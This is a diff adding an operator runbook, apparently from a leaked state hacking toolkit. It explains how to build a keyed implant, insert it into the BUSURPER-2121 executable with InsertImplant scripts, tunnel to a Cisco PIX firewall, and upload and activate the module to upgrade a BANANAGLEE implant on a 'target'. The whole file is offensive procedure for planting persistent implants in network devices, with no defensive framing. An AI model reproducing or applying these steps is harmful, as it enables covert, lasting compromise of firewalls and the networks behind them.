@@ -1,0 +1,98 @@
+### Upgrading a pix implant from a version of BF/BG to the current BG 
+# version using the BUSURPER-2121.module
+###
+
+### Offline.. create the implant and insert the implant into the BUSURPER-2121.exe file:
+# If there is already an Uprade.bg2011_###.exe in this directory:
+#  /mnt/burro/windows/EP-3.0/OfflineTools/BANANAGLEE_2.0.1.1/BANANAUSURPER_1.0.0.0/
+# then you can just copy that file, the BUSURPER-2121.mod and the BUSURPER-2121.exe.bin to
+# your ops disk and skip down the the section titled "How
+# to use the BUSURPER-2121.module"
+###
+
+# To create the implant, follow the instructions in "pix_create_keyed_implant.txt"
+# You should have created a file named like implant_701.bin
+
+# Now you need to insert that implant into the BUSURPER-2121.exe file.
+# NOTE: The same BUSURPER-2121.exe and BUSURPER-2121.mod are used for all versions
+# of BF/BG.
+
+# Copy these files into your working directory:
+
+cp -a /mnt/burro/firewalls/OfflineTools/BANANAGLEE_2.1.0.0/BANANAUSURPER_2.1.2.1/* .
+
+
+# Copy the implant_701.bin to your working directory
+
+
+# Now insert the implant_701.bin into the BUSURPER-2121.exe
+./InsertImplant.sh BUSURPER-2121.exe implant_701.bin
+
+./InsertImplant.pl -m BUSURPER-2121.exe -i implant_701.bin -d ../Dats/00000701.dat
+
+# You now have modified the BUSURPER-2121.exe file to contain the BG implant.
+# You need to test this module on a test pix before using it on a target.
+
+
+### How to use the BUSURPER-2121.module ###
+
+# Connect to the pix with the lp to verify it still has the IOS version you built
+# the new implant for. 
+
+# Setup tunnels on pitch
+-tunnel
+u 35442 <pix ip> 500 500
+
+./lp --lp 127.0.0.1 --implant 127.0.0.1 --idkey <project.key> --timeout 10 --sport 35402 --dport 35442
+
+Choose option 1 to Open a session
+# You'll see a line like this:
+# "OS Version    : 00000633" - this is IOS 6.3.3
+
+Choose option 9 to close your session.
+
+Choose option 0 to close your lp.
+
+## NOTE: Only continue on from here if the IOS on the pix matches the version you built
+# your new implant for. If it doesn't, go build a new one and come back.
+##
+
+# Copy the BUSURPER-2121.mod module, the BUSURPER-2121.exe.bin, and the BUSURPER-2121.exe to the directory with the 
+# other modules for the version of BF/BG you are running. This is either the 
+# lp/Modules directory for BF or the lp/Modules/PIX directory for BG
+
+# Re-connect to the pix with the lp
+
+Choose option 1 to open a session
+
+Choose option 36 to view uploaded modules.
+
+# If there are any currently loaded modules you should remove them now.
+
+Choose option 30 to List Uploadable Modules.
+
+# Make sure "BUSURPER-2121.mod" is listed.
+# If it isn't listed, you don't have the BUSURPER-2121.mod and the BUSURPER-2121.exe in the
+# correct directory... so close the lp and move those files to the correct directory
+# and then come back and continue with these insructions.
+
+Choose option 31 to Upload the BUSURPER-2121.mod module
+
+Choose option 32 to Activate the BUSURPER-2121.mod module
+
+# At this point communications will time out on the LP. You can verify by choosing
+# Option 10 and tring to read the Interface info. When it times out, it means you
+# have either upgraded successfully, the pix is rebooting, or it's dead.
+
+# Now, lets continue on the assumption you did everything correctly..
+
+# Go to the BG directory that matches the new implant.
+
+# Connect to the pix with the lp and the same key you used before.
+
+Choose Option 1 to open a session.
+
+# If you see "Implant Version: 2.0.1", you are successful!
+
+# Now you have the opportunity to speedplow the pix with the new version
+# of the implant (Which you should have prepared and tested before your op!)
